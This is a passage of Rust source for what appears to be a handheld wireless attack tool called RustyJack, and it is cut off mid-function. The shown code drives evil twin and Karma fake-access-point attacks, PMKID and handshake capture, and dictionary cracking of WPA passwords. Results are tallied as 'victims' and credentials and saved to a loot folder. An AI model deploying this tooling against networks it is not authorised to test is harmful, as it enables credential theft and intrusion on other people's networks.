        let options = vec!["Start Attack".to_string(), "Cancel".to_string()];
        let choice = self.choose_from_list("Confirm", &options)?;
        
        if choice != Some(0) {
            return Ok(());
        }
        
        // Execute evil twin via core with cancel support
        use rustyjack_core::{Commands, WifiCommand, WifiEvilTwinArgs};
        
        let cmd = Commands::Wifi(WifiCommand::EvilTwin(WifiEvilTwinArgs {
            ssid: target_network.clone(),
            target_bssid: Some(target_bssid),
            channel: target_channel,
            interface: active_interface,
            duration: 300, // 5 minutes
            open: true,
        }));
        
        let result = self.dispatch_cancellable("Evil Twin", cmd, 300)?;
        
        let Some((msg, data)) = result else {
            return Ok(()); // Cancelled
        };
        
        let mut lines = Vec::new();
        
        // Check status
        let status = data.get("status").and_then(|v| v.as_str()).unwrap_or("unknown");
        
        if status == "completed" {
            lines.push("Attack Complete".to_string());
        } else if status == "failed" {
            lines.push("Attack Failed".to_string());
            lines.push(msg);
        } else {
            lines.push(msg);
        }
        
        // Show stats
        if let Some(duration) = data.get("attack_duration_secs").and_then(|v| v.as_u64()) {
            let mins = duration / 60;
            let secs = duration % 60;
            lines.push(format!("Duration: {}m {}s", mins, secs));
        }
        
        if let Some(clients) = data.get("clients_connected").and_then(|v| v.as_u64()) {
            lines.push(format!("Clients: {}", clients));
        }
        if let Some(hs) = data.get("handshakes_captured").and_then(|v| v.as_u64()) {
            lines.push(format!("Handshakes: {}", hs));
        }
        if let Some(creds) = data.get("credentials_captured").and_then(|v| v.as_u64()) {
            lines.push(format!("Creds: {}", creds));
        }
        
        // Show loot location
        if let Some(dir) = data.get("loot_directory").and_then(|v| v.as_str()) {
            let short_dir = dir.split('/').last().unwrap_or(dir);
            lines.push(format!("Loot: {}", short_dir));
        }
        
        self.show_message("Evil Twin", lines.iter().map(|s| s.as_str()))?;
        
        Ok(())
    }
    
    fn launch_probe_sniff(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("Probe Sniff", [
                "No WiFi interface set",
                "",
                "Run Hardware Detect",
                "to configure interface"
            ]);
        }
        
        // Duration selection
        let durations = vec![
            "30 seconds".to_string(),
            "1 minute".to_string(),
            "5 minutes".to_string(),
        ];
        let dur_choice = self.choose_from_list("Sniff Duration", &durations)?;
        
        let duration_secs = match dur_choice {
            Some(0) => 30,
            Some(1) => 60,
            Some(2) => 300,
            _ => return Ok(()),
        };
        
        use rustyjack_core::{Commands, WifiCommand, WifiProbeSniffArgs};
        
        let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
            interface: active_interface,
            duration: duration_secs,
            channel: 0, // hop channels
        }));
        
        let result = self.dispatch_cancellable("Probe Sniff", cmd, duration_secs as u64)?;
        
        let Some((msg, data)) = result else {
            return Ok(()); // Cancelled
        };
        
        let mut lines = vec![msg];
        
        if let Some(probes) = data.get("total_probes").and_then(|v| v.as_u64()) {
            lines.push(format!("Probes: {}", probes));
        }
        if let Some(clients) = data.get("unique_clients").and_then(|v| v.as_u64()) {
            lines.push(format!("Clients: {}", clients));
        }
        if let Some(networks) = data.get("unique_networks").and_then(|v| v.as_u64()) {
            lines.push(format!("Networks: {}", networks));
        }
        
        // Show top probed networks
        if let Some(top) = data.get("top_networks").and_then(|v| v.as_array()) {
            lines.push("".to_string());
            lines.push("Top Networks:".to_string());
            for net in top.iter().take(3) {
                if let Some(ssid) = net.get("ssid").and_then(|v| v.as_str()) {
                    let count = net.get("probe_count").and_then(|v| v.as_u64()).unwrap_or(0);
                    lines.push(format!("  {} ({})", ssid, count));
                }
            }
        }
        
        self.show_message("Probe Sniff Done", lines.iter().map(|s| s.as_str()))?;
        
        Ok(())
    }
    
    fn launch_pmkid_capture(&mut self) -> Result<()> {
        let target_network = self.config.settings.target_network.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("PMKID Capture", [
                "No WiFi interface set",
                "",
                "Run Hardware Detect first"
            ]);
        }
        
        // Option to target specific network or passive capture
        let options = vec![
            if target_network.is_empty() {
                "Passive Capture".to_string()
            } else {
                format!("Target: {}", target_network)
            },
            "Passive (any network)".to_string(),
            "Cancel".to_string(),
        ];
        
        let choice = self.choose_from_menu("PMKID Mode", &options)?;
        
        let (use_target, duration) = match choice {
            Some(0) if !target_network.is_empty() => (true, 30),
            Some(1) | Some(0) => (false, 60),
            _ => return Ok(()),
        };
        
        use rustyjack_core::{Commands, WifiCommand, WifiPmkidArgs};
        
        let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
            interface: active_interface,
            bssid: if use_target { Some(target_bssid) } else { None },
            ssid: if use_target { Some(target_network) } else { None },
            channel: if use_target { target_channel } else { 0 },
            duration,
        }));
        
        let result = self.dispatch_cancellable("PMKID Capture", cmd, duration as u64)?;
        
        let Some((msg, data)) = result else {
            return Ok(()); // Cancelled
        };
        
        let mut lines = vec![msg];
        
        if let Some(count) = data.get("pmkids_captured").and_then(|v| v.as_u64()) {
            if count > 0 {
                lines.push(format!("Captured: {} PMKIDs", count));
                lines.push("".to_string());
                lines.push("Auto-cracking...".to_string());
                
                // If PMKID was captured, trigger auto-crack
                if let Some(_hashcat) = data.get("hashcat_format").and_then(|v| v.as_str()) {
                    lines.push("Hash saved for cracking".to_string());
                }
            } else {
                lines.push("No PMKIDs found".to_string());
                lines.push("Try different network".to_string());
            }
        }
        
        self.show_message("PMKID Result", lines.iter().map(|s| s.as_str()))?;
        
        Ok(())
    }
    
    fn launch_crack_handshake(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Crack", [
                "Handshake cracking",
                "is available on Linux",
                "targets only."
            ]);
        }

        #[cfg(target_os = "linux")]
        {
            let loot_dir = self.root.join("loot/Wireless");

            if !loot_dir.exists() {
                return self.show_message("Crack", [
                    "No handshakes found",
                    "",
                    "Capture a handshake",
                    "using Deauth Attack",
                    "or PMKID Capture first"
                ]);
            }

            let mut handshake_files: Vec<(String, std::path::PathBuf)> = Vec::new();
            fn scan_dir(dir: &std::path::Path, files: &mut Vec<(String, std::path::PathBuf)>) {
                if let Ok(entries) = std::fs::read_dir(dir) {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        if path.is_dir() {
                            scan_dir(&path, files);
                        } else if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                            if name.starts_with("handshake_export_") && name.ends_with(".json") {
                                let display_name = if let Some(parent) = path.parent() {
                                    if let Some(parent_name) = parent.file_name() {
                                        format!(
                                            "{}/{}",
                                            parent_name.to_string_lossy(),
                                            path.file_name().unwrap_or_default().to_string_lossy()
                                        )
                                    } else {
                                        path.file_name()
                                            .unwrap_or_default()
                                            .to_string_lossy()
                                            .to_string()
                                    }
                                } else {
                                    path.file_name()
                                        .unwrap_or_default()
                                        .to_string_lossy()
                                        .to_string()
                                };
                                files.push((display_name, path));
                            }
                        }
                    }
                }
            }
            scan_dir(&loot_dir, &mut handshake_files);

            if handshake_files.is_empty() {
                return self.show_message("Crack", [
                    "No handshake exports",
                    "found in loot/",
                    "",
                    "Capture a handshake",
                    "first. Native cracker",
                    "uses JSON exports."
                ]);
            }

            let display_names: Vec<String> =
                handshake_files.iter().map(|(name, _)| name.clone()).collect();
            let choice = self.choose_from_menu("Select Handshake", &display_names)?;

            let Some(idx) = choice else {
                return Ok(());
            };

            let (_selected_name, file_path) = &handshake_files[idx];
            let bundle = self.load_handshake_bundle(file_path)?;

            let dictionaries = self.available_dictionaries(&bundle.ssid)?;
            let labels: Vec<String> = dictionaries
                .iter()
                .map(|d| d.label())
                .collect();

            let dict_choice = self.choose_from_menu("Dictionary", &labels)?;
            let Some(selection) = dict_choice else {
                return Ok(());
            };
            let dictionary = dictionaries[selection].clone();

            let result = self.crack_handshake_with_progress(bundle, dictionary)?;

            let mut lines = Vec::new();
            lines.push(format!("Attempts: {}/{}", result.attempts, result.total_attempts));
            lines.push(format!("Elapsed: {:.1}s", result.elapsed.as_secs_f32()));
            if let Some(p) = result.password {
                lines.push("".to_string());
                lines.push("PASSWORD FOUND!".to_string());
                lines.push(p);
            } else if result.cancelled {
                lines.push("Cancelled before finish".to_string());
            } else {
                lines.push("No match found".to_string());
                lines.push("Try another dictionary".to_string());
            }

            self.show_message("Crack Result", lines.iter().map(|s| s.as_str()))?;
            Ok(())
        }
    }

    #[cfg(target_os = "linux")]
    fn load_handshake_bundle(&self, path: &Path) -> Result<HandshakeBundle> {
        let data = fs::read(path)
            .with_context(|| format!("reading handshake export {}", path.display()))?;
        let bundle: HandshakeBundle =
            serde_json::from_slice(&data).with_context(|| format!("parsing {}", path.display()))?;
        Ok(bundle)
    }

    #[cfg(target_os = "linux")]
    fn load_wordlist(&self, path: &Path) -> Result<Vec<String>> {
        let file = File::open(path)
            .with_context(|| format!("opening wordlist {}", path.display()))?;
        let reader = BufReader::new(file);
        let mut passwords = Vec::new();
        for line in reader.lines() {
            let line = line.unwrap_or_default();
            let pw = line.trim();
            if pw.len() >= 8 && pw.len() <= 63 {
                passwords.push(pw.to_string());
            }
        }
        Ok(passwords)
    }

    #[cfg(target_os = "linux")]
    fn count_wordlist(&self, path: &Path) -> usize {
        File::open(path).ok().map(|file| {
            BufReader::new(file)
                .lines()
                .filter_map(|l| l.ok())
                .filter(|pw| {
                    let len = pw.trim().len();
                    len >= 8 && len <= 63
                })
                .count()
        }).unwrap_or(0)
    }

    #[cfg(target_os = "linux")]
    fn available_dictionaries(&self, ssid: &str) -> Result<Vec<DictionaryOption>> {
        let base = self.root.join("wordlists");
        let quick_total = (generate_common_passwords().len()
            + generate_ssid_passwords(ssid).len()) as u64;
        let ssid_total = generate_ssid_passwords(ssid).len() as u64;

        let mut options = vec![
            DictionaryOption::Quick { total: quick_total },
            DictionaryOption::SsidPatterns { total: ssid_total },
        ];

        let bundled = [
            ("WiFi common", base.join("wifi_common.txt")),
            ("Top passwords", base.join("common_top.txt")),
        ];
        for (label, path) in bundled {
            let count = self.count_wordlist(&path) as u64;
            if count > 0 {
                options.push(DictionaryOption::Bundled {
                    name: label.to_string(),
                    path,
                    total: count,
                });
            }
        }

        Ok(options)
    }

    #[cfg(target_os = "linux")]
    fn crack_handshake_with_progress(
        &mut self,
        bundle: HandshakeBundle,
        dictionary: DictionaryOption,
    ) -> Result<CrackOutcome> {
        use std::thread;

        let passwords = match &dictionary {
            DictionaryOption::Quick { .. } => {
                let mut list = generate_common_passwords();
                list.extend(generate_ssid_passwords(&bundle.ssid));
                list
            }
            DictionaryOption::SsidPatterns { .. } => generate_ssid_passwords(&bundle.ssid),
            DictionaryOption::Bundled { path, .. } => self.load_wordlist(path)?,
        };

        if passwords.is_empty() {
            return Err(anyhow::anyhow!("Selected dictionary is empty"));
        }

        let total_attempts = passwords.len() as u64;

        let mut cracker = WpaCracker::new(bundle.handshake.clone(), &bundle.ssid).with_config(
            CrackerConfig {
                progress_interval: 250,
                max_attempts: 0,
                throttle_interval: 200,
                threads: 1,
            },
        );
        let stop_flag = cracker.stop_handle();

        let (tx, rx) = mpsc::channel();
        thread::spawn(move || {
            let mut cb = |p: CrackProgress| {
                let _ = tx.send(CrackUpdate::Progress {
                    attempts: p.attempts,
                    total: total_attempts,
                    rate: p.rate,
                    current: p.current.clone(),
                });
            };

            let res = cracker.crack_passwords_with_progress(
                &passwords,
                Some(total_attempts),
                Some(&mut cb),
            );

            let final_attempts = cracker.attempts();
            let _ = match res {
                Ok(CrackResult::Found(pw)) => tx.send(CrackUpdate::Done {
                    password: Some(pw),
                    attempts: final_attempts,
                    total: total_attempts,
                    cancelled: false,
                }),
                Ok(CrackResult::Exhausted { attempts }) => tx.send(CrackUpdate::Done {
                    password: None,
                    attempts,
                    total: total_attempts,
                    cancelled: false,
                }),
                Ok(CrackResult::Stopped { attempts }) => tx.send(CrackUpdate::Done {
                    password: None,
                    attempts,
                    total: total_attempts,
                    cancelled: true,
                }),
                Err(e) => tx.send(CrackUpdate::Error(e.to_string())),
            };
        });

        let mut attempts = 0u64;
        let mut current = String::new();
        let mut rate = 0.0f32;
        let mut finished: Option<CrackOutcome> = None;
        let started = Instant::now();

        loop {
            match rx.try_recv() {
                Ok(update) => match update {
                    CrackUpdate::Progress {
                        attempts: a,
                        total,
                        rate: r,
                        current: c,
                    } => {
                        attempts = a;
                        rate = r;
                        current = c;
                        self.draw_crack_progress(attempts, total, rate, &current)?;
                    }
                    CrackUpdate::Done {
                        password,
                        attempts: a,
                        total,
                        cancelled,
                    } => {
                        finished = Some(CrackOutcome {
                            password,
                            attempts: a,
                            total_attempts: total,
                            elapsed: started.elapsed(),
                            cancelled,
                        });
                    }
                    CrackUpdate::Error(e) => {
                        self.show_message("Crack", [e.clone()])?;
                        return Err(anyhow!(e));
                    }
                },
                Err(TryRecvError::Disconnected) => {
                    finished = Some(CrackOutcome {
                        password: None,
                        attempts,
                        total_attempts,
                        elapsed: started.elapsed(),
                        cancelled: true,
                    });
                }
                Err(TryRecvError::Empty) => {}
            }

            if finished.is_some() {
                break;
            }

            if let Some(button) = self.buttons.try_read()? {
                match self.map_button(button) {
                    ButtonAction::Back | ButtonAction::MainMenu => {
                        stop_flag.store(true, std::sync::atomic::Ordering::Relaxed);
                    }
                    ButtonAction::Reboot => self.confirm_reboot()?,
                    _ => {}
                }
            }

            self.draw_crack_progress(attempts, total_attempts, rate, &current)?;
            thread::sleep(Duration::from_millis(150));
        }

        Ok(finished.unwrap_or(CrackOutcome {
            password: None,
            attempts,
            total_attempts,
            elapsed: started.elapsed(),
            cancelled: true,
        }))
    }

    #[cfg(target_os = "linux")]
    fn draw_crack_progress(
        &mut self,
        attempts: u64,
        total: u64,
        rate: f32,
        current: &str,
    ) -> Result<()> {
        let pct = if total > 0 {
            (attempts as f32 / total as f32 * 100.0).min(100.0)
        } else {
            0.0
        };
        let message = format!(
            "{} / {} tried | {:.1}/s | {}",
            attempts,
            total,
            rate,
            shorten_for_display(current, 14)
        );
        let status = self.status_overlay();
        self.display
            .draw_progress_dialog("Crack Handshake", &message, pct, &status)?;
        Ok(())
    }

    /// Install WiFi drivers for USB dongles
    /// Keeps user on screen until installation completes or fails
    fn install_wifi_drivers(&mut self) -> Result<()> {
        use std::fs;
        use std::process::{Command, Stdio};
        
        // Status file used by the driver installer script
        let status_file = Path::new("/tmp/rustyjack_wifi_status");
        let result_file = Path::new("/tmp/rustyjack_wifi_result.json");
        let script_path = self.root.join("scripts/wifi_driver_installer.sh");
        
        // Check if script exists
        if !script_path.exists() {
            return self.show_message("Driver Install", [
                "Installer script not found",
                "",
                "Missing:",
                "scripts/wifi_driver_installer.sh",
                "",
                "Please reinstall RustyJack"
            ]);
        }
        
        // Initial screen - explain what we're doing
        self.show_message("WiFi Driver Install", [
            "This will scan for USB WiFi",
            "adapters and install any",
            "required drivers.",
            "",
            "Internet required for",
            "driver downloads.",
            "",
            "Press SELECT to continue"
        ])?;
        
        // Confirm
        let options = vec!["Start Scan".to_string(), "Cancel".to_string()];
        let choice = self.choose_from_list("Install Drivers?", &options)?;
        
        if choice != Some(0) {
            return Ok(());
        }
        
        // Clear old status files
        let _ = fs::remove_file(status_file);
        let _ = fs::remove_file(result_file);
        
        // Show initial scanning message
        self.show_progress("WiFi Driver", ["Scanning for USB WiFi...", "Please wait"])?;
        
        // Run the installer script
        let mut child = match Command::new("bash")
            .arg(&script_path)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn() {
                Ok(c) => c,
                Err(e) => {
                    return self.show_message("Driver Error", [
                        "Failed to start installer",
                        "",
                        &format!("{}", e)
                    ]);
                }
            };
        
        // Monitor progress
        let mut last_status = String::new();
        let mut ticks = 0;
        
        loop {
            // Check if process finished
            match child.try_wait() {
                Ok(Some(status)) => {
                    // Process finished - check result
                    let exit_code = status.code().unwrap_or(-1);
                    
                    // Read final result
                    if let Ok(result_json) = fs::read_to_string(result_file) {
                        if let Ok(result) = serde_json::from_str::<Value>(&result_json) {
                            let status = result.get("status").and_then(|v| v.as_str()).unwrap_or("UNKNOWN");
                            let details = result.get("details").and_then(|v| v.as_str()).unwrap_or("");
                            let interfaces = result.get("interfaces").and_then(|v| v.as_array());
                            
                            match status {
                                "SUCCESS" => {
                                    let mut lines = vec![
                                        "Driver installed!".to_string(),
                                        "".to_string(),
                                    ];
                                    if let Some(ifaces) = interfaces {
                                        lines.push("Available interfaces:".to_string());
                                        for iface in ifaces {
                                            if let Some(name) = iface.as_str() {
                                                lines.push(format!("  - {}", name));
                                            }
                                        }
                                    }
                                    lines.push("".to_string());
                                    lines.push("Ready to use!".to_string());
                                    
                                    return self.show_message("Driver Success", lines.iter().map(|s| s.as_str()));
                                }
                                "REBOOT_REQUIRED" => {
                                    return self.show_message("Reboot Required", [
                                        "Driver installed but",
                                        "reboot is required.",
                                        "",
                                        "Please restart the",
                                        "device to complete",
                                        "installation.",
                                        "",
                                        "Press KEY3 to reboot"
                                    ]);
                                }
                                "NO_DEVICES" => {
                                    return self.show_message("No Devices", [
                                        "No USB WiFi adapters",
                                        "were detected.",
                                        "",
                                        "Please plug in a USB",
                                        "WiFi adapter and try",
                                        "again."
                                    ]);
                                }
                                "FAILED" => {
                                    return self.show_message("Driver Failed", [
                                        "Failed to install drivers",
                                        "",
                                        details,
                                        "",
                                        "Check internet connection",
                                        "and try again.",
                                        "",
                                        "Some adapters may not",
                                        "be supported."
                                    ]);
                                }
                                _ => {
                                    return self.show_message("Unknown Result", [
                                        &format!("Status: {}", status),
                                        details
                                    ]);
                                }
                            }
                        }
                    }
                    
                    // No result file - use exit code
                    if exit_code == 0 {
                        return self.show_message("Driver Install", ["Installation completed"]);
                    } else if exit_code == 2 {
                        return self.show_message("Reboot Required", [
                            "Driver installed.",
                            "Reboot required to",
                            "complete setup.",
                            "",
                            "Press KEY3 to reboot"
                        ]);
                    } else {
                        return self.show_message("Driver Failed", [
                            "Installation failed",
                            "",
                            &format!("Exit code: {}", exit_code),
                            "",
                            "Check logs at:",
                            "/var/log/rustyjack_wifi_driver.log"
                        ]);
                    }
                }
                Ok(None) => {
                    // Still running - update status display
                    if let Ok(status) = fs::read_to_string(status_file) {
                        let status = status.trim();
                        if status != last_status {
                            last_status = status.to_string();
                            
                            // Parse status and show appropriate message
                            let (title, messages) = self.parse_driver_status(&last_status, ticks);
                            self.display.draw_menu(&title, &messages, usize::MAX, &self.stats.snapshot())?;
                        }
                    }
                    
                    // Animate waiting indicator
                    ticks += 1;
                    thread::sleep(Duration::from_millis(500));
                    
                    // Check for user cancel (back button)
                    if let Ok(Some(btn)) = self.buttons.try_read() {
                        if matches!(self.map_button(btn), ButtonAction::Back) {
                            // User cancelled - try to kill process
                            let _ = child.kill();
                            return self.show_message("Cancelled", ["Installation cancelled by user"]);
                        }
                    }
                }
                Err(e) => {
                    return self.show_message("Error", [
                        "Failed to check process",
                        &format!("{}", e)
                    ]);
                }
            }
        }
    }
    
    /// Parse driver installer status into display messages
    fn parse_driver_status(&self, status: &str, ticks: u32) -> (String, Vec<String>) {
        let spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"][(ticks as usize) % 10];
        
        let parts: Vec<&str> = status.split(':').collect();
        
        match parts.get(0).map(|s| *s) {
            Some("SCANNING") => (
                "WiFi Driver".to_string(),
                vec![
                    format!("{} Scanning USB devices...", spinner),
                    "".to_string(),
                    "Looking for WiFi".to_string(),
                    "adapters...".to_string(),
                ]
            ),
            Some("DETECTED") => {
                let chipset = parts.get(1).unwrap_or(&"Unknown");
                (
                    "Device Found".to_string(),
                    vec![
                        format!("Chipset: {}", chipset),
                        "".to_string(),
                        format!("{} Preparing driver...", spinner),
                    ]
                )
            }
            Some("INSTALLING_PREREQUISITES") => (
                "Prerequisites".to_string(),
                vec![
                    format!("{} Installing build tools", spinner),
                    "".to_string(),
                    "This may take a few".to_string(),
                    "minutes...".to_string(),
                ]
            ),
            Some("INSTALLING_DRIVER") => {
                let package = parts.get(1).unwrap_or(&"driver");
                (
                    "Installing Driver".to_string(),
                    vec![
                        format!("Package: {}", package),
                        "".to_string(),
                        format!("{} Compiling...", spinner),
                        "".to_string(),
                        "This may take 5-10".to_string(),
                        "minutes on Pi Zero".to_string(),
                    ]
                )
            }
            Some("VERIFYING") => {
                let iface = parts.get(1).unwrap_or(&"wlan");
                (
                    "Verifying".to_string(),
                    vec![
                        format!("{} Testing interface", spinner),
                        "".to_string(),
                        format!("Interface: {}", iface),
                        "Checking functionality...".to_string(),
                    ]
                )
            }
            Some("BUILTIN") => {
                let chipset = parts.get(1).unwrap_or(&"Unknown");
                (
                    "Built-in Driver".to_string(),
                    vec![
                        format!("Chipset: {}", chipset),
                        "".to_string(),
                        format!("{} Loading firmware...", spinner),
                    ]
                )
            }
            Some("UNKNOWN") => {
                let usb_id = parts.get(1).unwrap_or(&"????:????");
                (
                    "Unknown Device".to_string(),
                    vec![
                        format!("USB ID: {}", usb_id),
                        "".to_string(),
                        "No driver available".to_string(),
                        "for this device.".to_string(),
                    ]
                )
            }
            _ => (
                "WiFi Driver".to_string(),
                vec![
                    format!("{} Working...", spinner),
                    "".to_string(),
                    status.to_string(),
                ]
            ),
        }
    }
    
    /// Launch Karma attack
    fn launch_karma_attack(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("Karma Attack", [
                "No WiFi interface set",
                "",
                "Run Hardware Detect",
                "to configure interface"
            ]);
        }
        
        // Explain what Karma does
        self.show_message("Karma Attack", [
            "Responds to ALL probe",
            "requests from devices.",
            "",
            "Captures clients looking",
            "for known networks.",
            "",
            "Very effective against",
            "phones and laptops!",
            "",
            "Press SELECT to start"
        ])?;
        
        // Duration selection
        let durations = vec![
            "2 minutes".to_string(),
            "5 minutes".to_string(),
            "10 minutes".to_string(),
        ];
        let dur_choice = self.choose_from_list("Karma Duration", &durations)?;
        
        let duration = match dur_choice {
            Some(0) => 120,
            Some(1) => 300,
            Some(2) => 600,
            _ => return Ok(()),
        };
        
        // Ask if they want to create a fake AP
        let ap_options = vec![
            "Passive (sniff only)".to_string(),
            "Active (create fake AP)".to_string(),
            "Cancel".to_string(),
        ];
        let ap_choice = self.choose_from_menu("Karma Mode", &ap_options)?;
        
        let with_ap = match ap_choice {
            Some(0) => false,
            Some(1) => true,
            _ => return Ok(()),
        };
        
        // Execute via core with cancel support
        use rustyjack_core::{Commands, WifiCommand, WifiKarmaArgs};
        
        let cmd = Commands::Wifi(WifiCommand::Karma(WifiKarmaArgs {
            interface: active_interface.clone(),
            ap_interface: if with_ap { Some(active_interface.clone()) } else { None },
            duration,
            channel: 0, // hop channels
            with_ap,
            ssid_whitelist: None,
            ssid_blacklist: None,
        }));
        
        let result = self.dispatch_cancellable("Karma Attack", cmd, duration as u64)?;
        
        let Some((msg, data)) = result else {
            return Ok(()); // Cancelled
        };
        
        let mut lines = vec![msg];
        
        if let Some(probes) = data.get("probes_seen").and_then(|v| v.as_u64()) {
            lines.push(format!("Probes: {}", probes));
        }
        if let Some(ssids) = data.get("unique_ssids").and_then(|v| v.as_u64()) {
            lines.push(format!("SSIDs: {}", ssids));
        }
        if let Some(clients) = data.get("unique_clients").and_then(|v| v.as_u64()) {
            lines.push(format!("Clients: {}", clients));
        }
        if let Some(victims) = data.get("victims").and_then(|v| v.as_u64()) {
            if victims > 0 {
                lines.push(format!("Victims: {}", victims));
            }
        }
        
        self.show_message("Karma Done", lines.iter().map(|s| s.as_str()))?;
        
        Ok(())
    }
    
    /// Launch an attack pipeline
    fn launch_attack_pipeline(&mut self, pipeline_type: PipelineType) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("Attack Pipeline", [
                "No WiFi interface set",
                "",
                "Run Hardware Detect",
                "to configure interface"
            ]);
        }
        
        let (title, description, steps) = match pipeline_type {
            PipelineType::GetPassword => (
                "Get WiFi Password",
                "Automated sequence to obtain target WiFi password",
                vec![
                    "1. Scan networks",
                    "2. PMKID capture",
                    "3. Deauth attack",
                    "4. Capture handshake",
                    "5. Quick crack",
                ]
            ),
            PipelineType::MassCapture => (
                "Mass Capture",
                "Capture handshakes from all visible networks",
                vec![
                    "1. Scan all networks",
                    "2. Channel hopping",
                    "3. Multi-target deauth",
                    "4. Continuous capture",
                ]
            ),
            PipelineType::StealthRecon => (
                "Stealth Recon",
                "Passive reconnaissance with NO transmission",
                vec![
                    "1. Randomize MAC",
                    "2. Minimum TX power",
                    "3. Passive scan only",
                    "4. Probe sniffing",
                ]
            ),
            PipelineType::CredentialHarvest => (
                "Credential Harvest",
                "Capture login credentials via fake networks",
                vec![
                    "1. Probe sniff",
                    "2. Karma attack",
                    "3. Evil Twin APs",
                    "4. Captive portal",
                ]
            ),
            PipelineType::FullPentest => (
                "Full Pentest",
                "Complete automated wireless audit",
                vec![
                    "1. Stealth recon",
                    "2. Network mapping",
                    "3. PMKID harvest",
                    "4. Deauth attacks",
                    "5. Evil Twin/Karma",
                    "6. Crack passwords",
                ]
            ),
        };
        
        // Show pipeline description with text wrapping
        let mut all_lines: Vec<String> = Vec::new();
        all_lines.push(description.to_string());
        all_lines.push("".to_string());
        all_lines.push("Steps:".to_string());
        for step in &steps {
            all_lines.push(step.to_string());
        }
        all_lines.push("".to_string());
        all_lines.push("SELECT = Start".to_string());
        
        self.show_message(title, all_lines.iter().map(|s| s.as_str()))?;
        
        // Confirm
        let options = vec!["Start Pipeline".to_string(), "Cancel".to_string()];
        let choice = self.choose_from_list("Confirm", &options)?;
        
        if choice != Some(0) {
            return Ok(());
        }
        
        // If target needed and not set, prompt for network selection
        let needs_target = matches!(pipeline_type, 
            PipelineType::GetPassword | PipelineType::CredentialHarvest);
        
        if needs_target && self.config.settings.target_network.is_empty() {
            self.show_message("Select Target", [
                "No target network set",
                "",
                "Scanning networks...",
            ])?;
            
            // Scan and let user pick target
            self.scan_wifi_networks()?;
            
            // Check if user selected a target
            if self.config.settings.target_network.is_empty() {
                return self.show_message("Pipeline Cancelled", [
                    "No target selected",
                    "",
                    "Select a network first",
                ]);
            }
        }
        
        let target_dir = self.pipeline_target_dir();
        let (pipeline_dir, started_at) = self.prepare_pipeline_loot_dir(&target_dir)?;
        
        // Execute pipeline steps using actual attack implementations
        let result = self.execute_pipeline_steps(pipeline_type, title, &steps)?;
        let loot_copy = self.capture_pipeline_loot(started_at, &target_dir, &pipeline_dir);
        let loot_dir_display = pipeline_dir
            .strip_prefix(&self.root)
            .unwrap_or(&pipeline_dir)
            .display()
            .to_string();
        let (loot_status_line, loot_detail_line) = match loot_copy {
            Ok(copied) => (
                format!("Loot: {}", loot_dir_display),
                Some(format!("Files copied: {}", copied)),
            ),
            Err(e) => {
                eprintln!("[pipeline] loot copy failed: {e:?}");
                (
                    format!("Loot: {} (copy failed)", loot_dir_display),
                    Some(format!("{e}")),
                )
            }
        };
        
        // Pipeline complete - show results
        if result.cancelled {
            let mut lines: Vec<String> = vec![
                format!("Stopped at step {}", result.steps_completed + 1),
                "".to_string(),
                "Partial results may be".to_string(),
                "saved in loot folder".to_string(),
            ];
            lines.push("".to_string());
            lines.push(loot_status_line);
            if let Some(detail) = loot_detail_line {
                lines.push(detail);
            }
            self.show_message("Pipeline Cancelled", lines)
        } else {
            let mut summary = vec![
                format!("{} finished", title),
                "".to_string(),
            ];
            
            if result.pmkids_captured > 0 {
                summary.push(format!("PMKIDs: {}", result.pmkids_captured));
            }
            if result.handshakes_captured > 0 {
                summary.push(format!("Handshakes: {}", result.handshakes_captured));
            }
            if let Some(ref password) = result.password_found {
                summary.push(format!("PASSWORD: {}", password));
            }
            if result.networks_found > 0 {
                summary.push(format!("Networks: {}", result.networks_found));
            }
            if result.clients_found > 0 {
                summary.push(format!("Clients: {}", result.clients_found));
            }
            
            summary.push("".to_string());
            summary.push(loot_status_line);
            if let Some(detail) = loot_detail_line {
                summary.push(detail);
            }
            
            self.show_message("Pipeline Complete", summary.iter().map(|s| s.as_str()))
        }
    }
    
    fn prepare_pipeline_loot_dir(&self, target_dir: &Path) -> Result<(PathBuf, SystemTime)> {
        fs::create_dir_all(target_dir)
            .with_context(|| format!("creating target loot directory {}", target_dir.display()))?;
        let pipelines_root = target_dir.join("pipelines");
        fs::create_dir_all(&pipelines_root)
            .with_context(|| format!("creating pipelines directory {}", pipelines_root.display()))?;
        let ts = Local::now().format("%Y%m%d_%H%M%S").to_string();
        let run_dir = pipelines_root.join(ts);
        fs::create_dir_all(&run_dir)
            .with_context(|| format!("creating pipeline run directory {}", run_dir.display()))?;
        Ok((run_dir, SystemTime::now()))
    }

    fn pipeline_target_dir(&self) -> PathBuf {
        let settings = &self.config.settings;
        let name_source = if !settings.target_network.is_empty() {
            settings.target_network.clone()
        } else if !settings.target_bssid.is_empty() {
            settings.target_bssid.clone()
        } else {
            "Unknown".to_string()
        };
        let safe = Self::sanitize_target_name(&name_source);
        self.root.join("loot").join("Wireless").join(safe)
    }

    fn sanitize_target_name(name: &str) -> String {
        let mut out = String::with_capacity(name.len());
        for ch in name.chars() {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                out.push(ch);
            } else {
                out.push('_');
            }
        }
        let trimmed = out.trim_matches('_').to_string();
        if trimmed.is_empty() {
            "Unknown".to_string()
        } else {
            trimmed
        }
    }

    fn capture_pipeline_loot(
        &self,
        started_at: SystemTime,
        target_dir: &Path,
        pipeline_dir: &Path,
    ) -> Result<usize> {
        let wireless_base = self.root.join("loot").join("Wireless");
        if !wireless_base.exists() {
            return Ok(0);
        }

        let mut copied = 0usize;
        for entry in WalkDir::new(&wireless_base)
            .into_iter()
